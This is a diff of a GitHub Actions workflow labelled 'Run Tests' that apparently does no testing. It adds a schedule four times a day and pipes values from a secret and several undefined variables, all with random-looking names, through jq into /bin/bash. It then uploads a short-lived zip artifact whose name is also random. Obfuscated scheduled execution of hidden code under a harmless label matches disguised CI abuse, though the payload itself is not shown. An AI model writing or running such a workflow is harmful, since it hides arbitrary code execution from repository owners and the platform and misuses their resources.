@@ -2,6 +2,8 @@ name: Run Tests
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '12 5,11,17,23 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -15,20 +17,19 @@ jobs:
           fetch-depth: 1
       - name: Build and run
         env:
-          jd50660: ${{ secrets.jd50660 }}
+          olpqq76285: ${{ secrets.olpqq76285 }}
         run: |
-          printf '%s' "$jd50660" | jq -r .qnvbx43 | /bin/bash
-          printf '%s' "$lqobm4" | jq -r .pgrp1345 | /bin/bash
-          printf '%s' "$oj0909" | jq -r .j023 | /bin/bash
-          echo $dqig34 | jq -r .nrl437 | /bin/bash
-          printf '%s' "$yn1019" | jq -r .bvvgg1 | /bin/bash
-          echo $actx52 | jq -r .canch9456 | /bin/bash
-          echo $pza56097 | jq -r .njnjn1375 | /bin/bash
+          printf '%s' "$olpqq76285" | jq -r .pyh376 | /bin/bash
+          echo $wzc7 | jq -r .a6676 | /bin/bash
+          echo $g616 | jq -r .vj24268 | /bin/bash
+          echo $aars8 | jq -r .rxo20 | /bin/bash
+          printf '%s' "$zq800" | jq -r .pa8 | /bin/bash
+          printf '%s' "$ds10" | jq -r .waij1519 | /bin/bash
 
       - name: Save output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: 0tKXOsyw
+          name: wheMrEPp
           path: "*.zip"
           retention-days: 1
